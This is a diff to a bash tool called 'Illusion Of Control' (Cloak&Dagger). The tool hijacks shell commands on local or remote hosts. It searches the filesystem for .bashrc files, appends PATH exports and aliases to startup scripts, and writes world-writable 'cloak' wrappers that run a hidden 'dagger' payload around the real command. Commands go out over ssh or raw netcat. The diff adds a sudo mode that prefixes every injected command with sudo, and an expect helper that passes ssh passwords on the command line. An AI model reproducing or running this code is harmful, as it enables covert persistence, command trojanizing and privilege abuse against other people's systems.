@@ -4,11 +4,12 @@
 #
 # (I.O.C) Illusion Of Control - v1.0Cloak&Dagger
 
+declare -A CARGO_SCRIPTS
 declare -a BASH_STARTUP_SCRIPTS
 
 SCRIPT_NAME='Illusion Of Control'
 VERSION='Cloak&Dagger'
-VERSION_NO='1.0'
+VERSION_NO='1.1'
 
 # HOT PARAMETERS
 
@@ -28,11 +29,16 @@ TMP_FILE='/tmp/ioc-cli.tmp'
 TIMEOUT_SEC=5
 HOME_DIR="/home"
 SU_DIR="/root"
+PARENT_DIR="`dirname ${BASH_SOURCE[0]}`"
 BASH_RC=".bashrc"
 SHELL_DIRECTORY_PATHS=( `echo $PATH | sed 's/:/ /g'` )
 SHELL_COMMAND_PATHS=()
 CNX_COUNT=0
 COUNT_FILE='.ioc.cnx.cnt'
+SUDO_FLAG=0
+CARGO_SCRIPTS=(
+['ssh-cmd']="${PARENT_DIR}/ssh-command.exp"
+)
 BASH_STARTUP_SCRIPTS=(
 "/etc/profile"
 "/etc/bash_profile"
@@ -114,6 +120,16 @@ function fetch_all_bash_startup_scripts () {
 }
 
 # SETTERS
+
+function set_sudo_flag () {
+    local FLAG=$1
+    if [ ! $FLAG -eq $FLAG ]; then
+        echo "[ WARNING ]: Invalid SUDO flag value ($FLAG). Defaulting to 0."
+        local FLAG=0
+    fi
+    SUDO_FLAG=$FLAG
+    return 0
+}
 
 function set_remote_path_export () {
     local DIRECTORY="$1"
@@ -407,17 +423,6 @@ function ensure_cloak_execution_rights () {
 
 # CONNECTORS
 
-function connect_and_execute_raw () {
-    local COMMAND="$1"
-    local CONNECTION_DETAILS="$2"
-    CNX_ADDR=`fetch_remote_address_from_connection_details "$CONNECTION_DETAILS"`
-    CNX_PORT=`fetch_remote_port_from_connection_details "$CONNECTION_DETAILS"`
-    # [ WARNING ]: Using raw connections you cannot confirm command output or
-    # exit codes.
-    CNX=`echo "$COMMAND" | nc "$CNX_ADDR" $CNX_PORT -w $TIMEOUT_SEC` # 2>&1
-    return 0
-}
-
 function connect_and_execute_ssh () {
     local COMMAND="$1"
     local CONNECTION_DETAILS="$2"
@@ -425,6 +430,10 @@ function connect_and_execute_ssh () {
     CNX_PORT=`fetch_remote_port_from_connection_details "$CONNECTION_DETAILS"`
     CNX_USER=`fetch_remote_user_from_connection_details "$CONNECTION_DETAILS"`
     CNX_PASS=`fetch_remote_password_from_connection_details "$CONNECTION_DETAILS"`
+    if [ -f "${CARGO_SCRIPTS['ssh-cmd']}" ]; then
+        ${CARGO_SCRIPTS['ssh-cmd']} ${CNX_USER} ${CNX_ADDR} ${CNX_PORT} ${CNX_PASS} ${COMMAND} &> /dev/null
+        return $?
+    fi
     echo "$CNX_PASS" > "$TMP_FILE" 2> /dev/null
     if [ -z "$CNX_PASS" ]; then
         ssh -p $CNX_PORT "$CNX_USER@$CNX_ADDR" "$COMMAND"
@@ -437,6 +446,18 @@ function connect_and_execute_ssh () {
     fi
     echo -n > "$TMP_FILE" 2> /dev/null
     return $EXIT_CODE
+}
+
+
+function connect_and_execute_raw () {
+    local COMMAND="$1"
+    local CONNECTION_DETAILS="$2"
+    CNX_ADDR=`fetch_remote_address_from_connection_details "$CONNECTION_DETAILS"`
+    CNX_PORT=`fetch_remote_port_from_connection_details "$CONNECTION_DETAILS"`
+    # [ WARNING ]: Using raw connections you cannot confirm command output or
+    # exit codes.
+    CNX=`echo "$COMMAND" | nc "$CNX_ADDR" $CNX_PORT -w $TIMEOUT_SEC` # 2>&1
+    return 0
 }
 
 function connect_and_execute () {
@@ -727,27 +748,43 @@ function format_export_remote_path_directory_instruction () {
     local DIRECTORY="$1"
     local SCRIPT_PATH="$2"
     local EXPORT='export PATH='"$DIRECTORY"':${PATH}'
-    echo "echo '$EXPORT' 2> /dev/null >> '$SCRIPT_PATH'; echo "'$?'
+    local COMMAND="echo '$EXPORT' 2> /dev/null >> '$SCRIPT_PATH'; echo "'$?'
+    if [ ${SUDO_FLAG} -eq 1 ]; then
+        local COMMAND="sudo ${COMMAND}"
+    fi
+    echo ${COMMAND}
     return $?
 }
 
 function format_set_alias_to_script_path_instruction () {
     local ALIAS="$1"
     local SCRIPT_PATH="$2"
-    echo "echo '$ALIAS' 2> /dev/null >> '$SCRIPT_PATH'; echo "'$?'
+    local COMMAND="echo '$ALIAS' 2> /dev/null >> '$SCRIPT_PATH'; echo "'$?'
+    if [ ${SUDO_FLAG} -eq 1 ]; then
+        local COMMAND="sudo ${COMMAND}"
+    fi
+    echo ${COMMAND}
     return $?
 }
 
 function format_clear_cloak_instruction () {
     local CMD_CLOAK="$1"
-    echo "echo -n 2> /dev/null > $CMD_CLOAK; echo "'$?'
+    local COMMAND="echo -n 2> /dev/null > $CMD_CLOAK; echo "'$?'
+    if [ ${SUDO_FLAG} -eq 1 ]; then
+        local COMMAND="sudo ${COMMAND}"
+    fi
+    echo ${COMMAND}
     return $?
 }
 
 function format_add_shebang_to_cloak_instruction () {
     local BANG="$1"
     local CLOAK="$2"
-    echo "echo '${BANG}' 2> /dev/null > $CLOAK; echo "'$?'
+    local COMMAND="echo '${BANG}' 2> /dev/null > $CLOAK; echo "'$?'
+    if [ ${SUDO_FLAG} -eq 1 ]; then
+        local COMMAND="sudo ${COMMAND}"
+    fi
+    echo ${COMMAND}
     return $?
 }
 
@@ -756,8 +793,14 @@ function format_append_to_cloak_pre_exec_instruction () {
     local DAGGER_FILE_PATH="$2"
     local CMD_CLOAK="$3"
     DAGGER=`cat $DAGGER_FILE_PATH`
-    echo "echo '${DAGGER}' | grep -v '^#!/' >> $CMD_CLOAK;"\
-        "echo '$COMMAND \$@' 2> /dev/null >> $CMD_CLOAK; echo "'$?'
+    local FRMT_CMD1="echo '${DAGGER}' | grep -v '^#!/' >> $CMD_CLOAK;"
+    local FRMT_CMD2="echo '$COMMAND \$@' 2> /dev/null >> $CMD_CLOAK; echo "'$?'
+    if [ ${SUDO_FLAG} -eq 1 ]; then
+        local FRMT_CMD1="sudo ${FRMT_CMD1}"
+        local FRMT_CMD2="sudo ${FRMT_CMD2}"
+    fi
+    local FRMT_CMD="${FRMT_CMD1} ${FRMT_CMD2}"
+    echo ${FRMT_CMD}
     return $?
 }
 
@@ -766,51 +809,89 @@ function format_append_to_cloak_post_exec_instruction () {
     local DAGGER_FILE_PATH="$2"
     local CMD_CLOAK="$3"
     DAGGER=`cat $DAGGER_FILE_PATH`
-    echo "echo '$COMMAND \$@' >> $CMD_CLOAK;"\
-        "echo '${DAGGER}' | grep -v '^#!/' >> $CMD_CLOAK; echo "'$?'
+    local FRMT_CMD1="echo '$COMMAND \$@' >> $CMD_CLOAK;"
+    local FRMT_CMD2="echo '${DAGGER}' | grep -v '^#!/' >> $CMD_CLOAK; echo "'$?'
+    if [ ${SUDO_FLAG} -eq 1 ]; then
+        local FRMT_CMD1="sudo ${FRMT_CMD1}"
+        local FRMT_CMD2="sudo ${FRMT_CMD2}"
+    fi
+    local FRMT_CMD="${FRMT_CMD1} ${FRMT_CMD2}"
+    echo ${FRMT_CMD}
     return $?
 }
 
 function format_find_all_bashrc_files_instruction () {
-    echo "find / -name '$BASH_RC' -type f 2> /dev/null"
+    local COMMAND="find / -name '$BASH_RC' -type f 2> /dev/null"
+    if [ ${SUDO_FLAG} -eq 1 ]; then
+        local COMMAND="sudo ${COMMAND}"
+    fi
+    echo ${COMMAND}
     return $?
 }
 
 function format_ensure_remote_path_directory_exists_instruction () {
     local DIR_PATH="$1"
-    echo "[ -d '$DIR_PATH' ] &> /dev/null ||"\
-        "(mkdir -p '$DIR_PATH' &> /dev/null &&"\
-        "chmod 777 $DIR_PATH &> /dev/null); echo "'$?'
+    local FRMT_CMD1="[ -d '$DIR_PATH' ] &> /dev/null || ("
+    local FRMT_CMD2="mkdir -p '$DIR_PATH' &> /dev/null && "
+    local FRMT_CMD3="chmod 777 $DIR_PATH &> /dev/null); echo "'$?'
+    if [ ${SUDO_FLAG} -eq 1 ]; then
+        local COMMAND="sudo ${COMMAND}"
+        local FRMT_CMD1="sudo $FRMT_CMD1"
+        local FRMT_CMD2="sudo $FRMT_CMD2"
+        local FRMT_CMD3="sudo $FRMT_CMD3"
+    fi
+    local COMMAND="$FRMT_CMD1 $FRMT_CMD2 $FRMT_CMD3"
+    echo ${COMMAND}
     return $?
 }
 
 function format_set_remote_cloak_execution_rights_instruction () {
     local CLOAK_FILE_PATH="$1"
-    echo "chmod 777 $CLOAK_FILE_PATH &> /dev/null; echo "'$?'
+    local COMMAND="chmod 777 $CLOAK_FILE_PATH &> /dev/null; echo "'$?'
+    if [ ${SUDO_FLAG} -eq 1 ]; then
+        local COMMAND="sudo ${COMMAND}"
+    fi
+    echo ${COMMAND}
     return $?
 }
 
 function format_check_remote_cloak_execution_rights_instruction () {
     local CLOAK_FILE_PATH="$1"
-    echo "chmod 777 '$CLOAK_FILE_PATH' &> /dev/null; echo "'$?'
+    local COMMAND="chmod 777 '$CLOAK_FILE_PATH' &> /dev/null; echo "'$?'
+    if [ ${SUDO_FLAG} -eq 1 ]; then
+        local COMMAND="sudo ${COMMAND}"
+    fi
+    echo ${COMMAND}
     return $?
 }
 
 function format_check_remote_command_exists_instruction () {
     local COMMAND="$1"
-    echo "type $COMMAND &> /dev/null; echo "'$?'
+    local COMMAND="type $COMMAND &> /dev/null; echo "'$?'
+    if [ ${SUDO_FLAG} -eq 1 ]; then
+        local COMMAND="sudo ${COMMAND}"
+    fi
+    echo ${COMMAND}
     return $?
 }
 
 function format_check_remote_path_directory_exists_instruction () {
     local DIR_PATH="$1"
-    echo "[ -d $DIR_PATH ] &> /dev/null; echo "'$?'
+    local COMMAND="[ -d $DIR_PATH ] &> /dev/null; echo "'$?'
+    if [ ${SUDO_FLAG} -eq 1 ]; then
+        local COMMAND="sudo ${COMMAND}"
+    fi
+    echo ${COMMAND}
     return $?
 }
 
 function format_check_remote_path_directory_set_instruction () {
     local DIR_PATH="$1"
-    echo "echo \$PATH | grep $DIR_PATH &> /dev/null; echo "'$?'
+    local COMMAND="echo \$PATH | grep $DIR_PATH &> /dev/null; echo "'$?'
+    if [ ${SUDO_FLAG} -eq 1 ]; then
+        local COMMAND="sudo ${COMMAND}"
+    fi
+    echo ${COMMAND}
     return $?
 }
 
@@ -955,8 +1036,7 @@ function display_banner () {
     else
         local COMMAND="all"
     fi
-    echo "
-[ SETUP PATH ]: $SETUP_PATH
+    echo "[ SETUP PATH ]: $SETUP_PATH
 [ FORCE      ]: $FORCE_COMMAND
 [ COMMAND    ]: $COMMAND
 [ ORDER      ]: $CLOAK_ORDER
@@ -967,6 +1047,7 @@ function display_banner () {
 [ REMOTE     ]: $REMOTE
 [ TMP FILE   ]: $TMP_FILE
 [ TIMEOUT    ]: $TIMEOUT_SEC
+[ SUDO       ]: $SUDO_FLAG
     "
 }
 
@@ -1013,7 +1094,9 @@ function display_usage () {
           |                    Defaults to (/tmp/ioc-cli.tmp)
 
     -w=   | --wait=            Implies -t=remote. Sets the number of seconds to
-                               wait until connection timeout.
+          |                    wait until connection timeout.
+
+    -S    | --sudo             Run commands (remotely or localy) using SUDO.
 
     [ EXAMPLE ]: $0
         (--help           |-h)
@@ -1043,6 +1126,7 @@ function display_usage () {
         (--target         |-t)=remote              # (local    | remote   )
         (--connection-type|-cnx)=ssh               # (raw      | ssh      )
         (--remote         |-r)=sucker@127.0.0.1:22:# user@address:port:password
+        (--sudo           |-S)
 
 EOF
 }
@@ -1065,6 +1149,10 @@ do
         -s|--set-path)
             set_setup_path_flag 1
             echo "[ SETUP ]: Setup PATH flag ($?)."
+            ;;
+        -S|--sudo)
+            set_sudo_flag 1
+            echo "[ SETUP ]: Setup SUDO flag ($?)."
             ;;
         -f|--force)
             set_force_flag 1
